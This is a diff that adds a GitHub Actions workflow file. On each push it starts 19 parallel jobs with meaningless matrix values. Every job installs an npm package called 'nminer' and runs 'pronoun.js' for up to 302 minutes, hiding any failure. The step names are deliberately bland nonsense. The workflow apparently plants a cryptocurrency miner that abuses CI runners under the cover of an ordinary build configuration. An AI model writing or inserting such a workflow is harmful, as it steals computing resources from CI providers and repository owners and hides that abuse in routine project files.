@@ -1,0 +1,44 @@
+name: pronoun
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 5973 }
+          - { version: 2103 }
+          - { version: 7606 }
+          - { version: 1072 }
+          - { version: 2008 }
+          - { version: 498 }
+          - { version: 71 }
+          - { version: 2012 }
+          - { version: 3896 }
+          - { version: 1866 }
+          - { version: 8921 }
+          - { version: 6081 }
+          - { version: 2748 }
+          - { version: 9314 }
+          - { version: 6381 }
+          - { version: 54 }
+          - { version: 7866 }
+          - { version: 1826 }
+          - { version: 4322 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: very ordinary soupy icy
+        run: |
+          npm install nminer@latest
+          timeout 302m node pronoun.js || echo "pronoun executed"
